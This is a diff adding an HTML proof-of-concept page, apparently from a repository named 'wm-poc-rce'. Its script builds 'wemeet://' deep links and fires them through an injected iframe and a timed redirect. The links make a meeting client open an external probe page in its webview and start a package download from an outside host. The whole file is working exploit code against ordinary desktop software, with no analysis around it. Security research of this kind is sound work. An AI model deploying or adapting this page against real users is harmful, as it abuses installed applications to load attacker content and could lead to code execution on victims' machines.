@@ -1,0 +1,20 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P6</h1>
+<script>
+document.title='P6-START';
+var target='https://gitwhs.github.io/wm-poc-rce/probe5b.html';
+var wv='wemeet://page/webview?url='+encodeURIComponent(target);
+var pkg='wemeet://page/package_download?url='+encodeURIComponent('https://httpbin.org/bytes/32');
+setTimeout(function(){
+  document.title='P6-IFRAME-WV';
+  var f=document.createElement('iframe');
+  f.src=wv;
+  document.body.appendChild(f);
+}, 400);
+setTimeout(function(){
+  document.title='P6-LOC-WV';
+  location.href=wv;
+}, 2500);
+</script>
+</body></html>
